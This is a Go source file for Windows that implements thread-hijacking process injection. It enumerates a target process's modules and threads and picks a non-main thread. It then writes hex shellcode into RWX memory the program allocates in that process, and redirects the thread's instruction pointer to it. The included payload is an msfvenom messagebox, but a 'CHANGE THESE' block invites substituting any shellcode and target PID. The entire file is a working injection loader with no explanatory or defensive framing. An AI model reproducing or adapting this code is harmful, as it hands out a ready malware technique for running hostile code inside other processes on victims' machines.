package main

import (
	"fmt"
	"unsafe"
	"strings"
	"syscall"
	"encoding/hex"
	"golang.org/x/sys/windows"
)

// CHANGE THESE
var (
	PID = 0
	blacklist = [...]string{}
	// msfvenom -p windows/x64/messagebox TEXT="PWNED" TITLE="PWNED" ICON=WARNING -f hex
	shellcode = "fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1300000003e488d95fe0000003e4c8d85040100004831c941ba45835607ffd54831c941baf0b5a256ffd550574e45440050574e454400"
)

var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	GetThreadTimes = kernel32.MustFindProc("GetThreadTimes")
	VirtualAllocEx = kernel32.MustFindProc("VirtualAllocEx")
	SuspendThread = kernel32.MustFindProc("SuspendThread")
	GetThreadContext = kernel32.MustFindProc("GetThreadContext")
	SetThreadContext = kernel32.MustFindProc("SetThreadContext")

	ntdll = syscall.MustLoadDLL("ntdll.dll")
	NtQueryInformationThread = ntdll.MustFindProc("NtQueryInformationThread")
)

const (
	ThreadQuerySetWin32StartAddress = 0x09
	CONTEXT_AMD64 = 0x100000
	CONTEXT_CONTROL = 0x1
	CONTEXT_INTEGER = 0X2
	CONTEXT_SEGMENTS = 0X4
	CONTEXT_FLOATING_POINT = 0X8
	CONTEXT_DEBUG_REGISTERS = 0X10
	CONTEXT_ALL = (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS)
)

// https://pkg.go.dev/github.com/0xrawsec/golang-win32/win32?GOOS=windows#M128A
type M128A struct {
	Low  uint64
	High int64
}

// https://pkg.go.dev/github.com/0xrawsec/golang-win32/win32?GOOS=windows#XMM_SAVE_AREA32
type XMM_SAVE_AREA32 struct {
	ControlWord    uint16
	StatusWord     uint16
	TagWord        uint8
	Reserved1      uint8
	ErrorOpcode    uint16
	ErrorOffset    uint32
	ErrorSelector  uint16
	Reserved2      uint16
	DataOffset     uint32
	DataSelector   uint16
	Reserved3      uint16
	MxCsr          uint32
	MxCsr_Mask     uint32
	FloatRegisters [8]M128A
	XmmRegisters   [16]M128A
	Reserved4      [96]uint16
}

// https://pkg.go.dev/github.com/0xrawsec/golang-win32@v1.0.12/win32#CONTEXT
type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FloatSave            XMM_SAVE_AREA32
	VectorRegister       [26]M128A
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

type Module struct {
	name string
	size int64
	baseAddress	int64
	peakAddress	int64
}

type Thread struct {
	id int
	creationTime windows.Filetime
	startAddress int64
}

func blacklisted(s string) bool {
	for _, module := range blacklist {
		if s == module {
			return true
		}
	}

	return false
}

func main() {
	fmt.Println("[*] Enumerating modules... ")
	modules := []Module{}
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE|windows.TH32CS_SNAPMODULE32, uint32(PID))
	if err != nil {
		fmt.Println("[!] CreateToolhelp32Snapshot failure")
		return
	}

	module := windows.ModuleEntry32{}
	module.Size = uint32(unsafe.Sizeof(module))
	err = windows.Module32First(snapshot, &module)
	if err != nil {
		fmt.Println("[!] Module32First failure")
		return
	}

	for {
		size := int64(module.ModBaseSize)
		baseAddress := int64(module.ModBaseAddr)
		peakAddress := baseAddress + size

		name := []byte{}
		for _, i := range module.Module {
			if i == 0 {
				break
			}

			name = append(name, byte(i))
		}

		modules = append(modules, Module{strings.ToLower(string(name)), size, baseAddress, peakAddress})
		err = windows.Module32Next(snapshot, &module)
		if errno, ok := err.(syscall.Errno); ok {
			if errno == windows.ERROR_NO_MORE_FILES {
				break
			} else {
				fmt.Println("[!] Module32Next failure")
				return
			}
		}
	}

	fmt.Println("[*] Enumerating threads... ")
	threads := []Thread{}
	snapshot, err = windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, uint32(PID))
	if err != nil {
		fmt.Println("[!] CreateToolhelp32Snapshot failure")
		return
	}

	thread := windows.ThreadEntry32{}
	thread.Size = uint32(unsafe.Sizeof(thread))
	err = windows.Thread32First(snapshot, &thread)
	if err != nil {
		fmt.Println("[!] Thread32First failure")
		return
	}

	for {
		if int(thread.OwnerProcessID) == PID {
			threads = append(threads, Thread{int(thread.ThreadID), windows.Filetime{}, 0})
		}
		
		err = windows.Thread32Next(snapshot, &thread)
		if errno, ok := err.(syscall.Errno); ok {
			if errno == windows.ERROR_NO_MORE_FILES {
				break
			} else {
				fmt.Println("[!] Thread32Next failure")
				return
			}
		}
	}

	for index, thread := range threads {
		handle, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION|windows.THREAD_QUERY_LIMITED_INFORMATION, false, uint32(thread.id))
		if err != nil {
			fmt.Println("[!] OpenThread failure")
			return
		}

		var creationTime windows.Filetime
		var exitTime windows.Filetime
		var kernelTime windows.Filetime
		var userTime windows.Filetime
		ret, _, _ := GetThreadTimes.Call(uintptr(handle), uintptr(unsafe.Pointer(&creationTime)), uintptr(unsafe.Pointer(&exitTime)), uintptr(unsafe.Pointer(&kernelTime)), uintptr(unsafe.Pointer(&userTime)))
		if ret == 0 {
			fmt.Println("[!] GetThreadTimes failure")
			return
		}

		var startAddress uint64
		ret, _, _ = NtQueryInformationThread.Call(uintptr(handle), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&startAddress)), uintptr(unsafe.Sizeof(startAddress)), 0)
		if ret != 0 {
			fmt.Println("[!] NtQueryInformationThread failure")
		}

		threads[index].creationTime = creationTime
		threads[index].startAddress = int64(startAddress)
	}

	fmt.Println("[*] Identifying target thread...")
	lowestCreationTime := threads[0].creationTime.LowDateTime
	for _, thread := range threads {
		if thread.creationTime.LowDateTime <= lowestCreationTime {
			lowestCreationTime = thread.creationTime.LowDateTime
		}
	}

	var target Thread
	for _, thread := range threads {
		// skip main thread
		if thread.creationTime.LowDateTime == lowestCreationTime {
			continue
		}

		for _, module := range modules {
			if thread.startAddress >= module.baseAddress && thread.startAddress <= module.peakAddress && !blacklisted(module.name) {
				target = thread
				break
			}
		}
	}

	fmt.Printf("[*] Hijacking thread %d...\n", target.id)
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(PID))
	if err != nil {
		fmt.Println("[!] OpenProcess failure")
		return
	}

	shellcodeBytes, _ := hex.DecodeString(shellcode)
	shellcodeAddress, _, _ := VirtualAllocEx.Call(uintptr(handle), 0, uintptr(len(shellcodeBytes)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if shellcodeAddress == 0 {
		fmt.Println("[!] VirtualAllocEx failure")
		return
	}

	var bytesWritten uintptr
	err = windows.WriteProcessMemory(handle, shellcodeAddress, &shellcodeBytes[0], uintptr(len(shellcodeBytes)), &bytesWritten)
	if err != nil {
		fmt.Println("[!] WriteProcessMemory failure")
		return
	}

	handle, err = windows.OpenThread(windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION|windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT, false, uint32(target.id))
	if err != nil {
		fmt.Println("[!] OpenThread failure")
		return
	}

	ret, _, _ := SuspendThread.Call(uintptr(handle))
	if ret != 0 {
		fmt.Println("[!] SuspendThread failure")
		return
	}

	var context CONTEXT
	context.ContextFlags = CONTEXT_ALL
	ret, _, _ = GetThreadContext.Call(uintptr(handle), uintptr(unsafe.Pointer(&context)))
	if ret == 0 {
		fmt.Println("[!] GetThreadContext failure")
		return
	}

	context.Rip = uint64(shellcodeAddress)
	ret, _, _ = SetThreadContext.Call(uintptr(handle), uintptr(unsafe.Pointer(&context)))
	if ret == 0 {
		fmt.Println("[!] SetThreadContext failure")
		return
	}

	_, err = windows.ResumeThread(handle)
	if err != nil {
		fmt.Println("[!] ResumeThread failure")
		return
	}
}
